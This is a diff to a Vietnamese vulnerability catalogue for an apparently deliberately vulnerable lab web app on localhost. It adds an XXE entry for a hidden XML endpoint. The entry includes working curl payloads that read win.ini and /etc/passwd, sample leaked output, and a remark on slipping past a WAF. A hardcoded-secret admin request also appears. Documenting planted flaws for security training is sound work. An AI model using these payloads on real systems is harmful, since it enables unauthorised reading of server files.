@@ -15,6 +15,7 @@
 | 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
 | 5 | CSRF | 🟡 Trung bình | Toàn bộ API (không kiểm tra CSRF token) | CWE-352 |
 | 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |
+| 7 | XXE (XML External Entity) | 🔴 Nghiêm trọng | `XmlPingServlet.java` | CWE-611 |
 
 ---
 
@@ -129,4 +130,38 @@ Toàn bộ form và API **không có CSRF token**. Lỗ hổng này **không b�
 Admin secret key hardcode `"dev-secret-key-change-me"`.
 ```bash
 curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"
+```
+
+---
+
+## 7. 🔴 XXE (XML External Entity)
+
+### Mô tả
+Một Endpoint API ẩn tên là `POST /api/xml-ping` dùng để test bằng XML đã bị bỏ quên. Nó sử dụng `DocumentBuilderFactory` mặc định, **không** filter DTD và External Entities. Do lỗ hổng này nhận dữ liệu qua POST (body), nó **có thể dễ dàng qua mặt Cloudflare WAF** tùy vào payload, HOẶC do Endpoint không phổ biến nên WAF không chặn chặt. Thiết kế lỗ hổng dưới dạng **In-Band XXE**, nội dung file trích xuất được sẽ trả về ngay trong kết quả `{"echo": "..."}`.
+
+### Khai thác (KHÔNG cần đăng nhập)
+
+Gửi một request POST chứa payload XXE tới `/api/xml-ping`.
+
+**Windows (Đọc file win.ini):**
+```bash
+curl -X POST http://localhost:8081/api/xml-ping \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><ping>&xxe;</ping>'
+```
+
+**Linux (Đọc file /etc/passwd):**
+```bash
+curl -X POST http://localhost:8081/api/xml-ping \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><ping>&xxe;</ping>'
+```
+
+**Kết quả trả về sẽ có dạng:**
+```json
+{
+  "success": true,
+  "message": "Ping received",
+  "echo": "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n"
+}
 ```
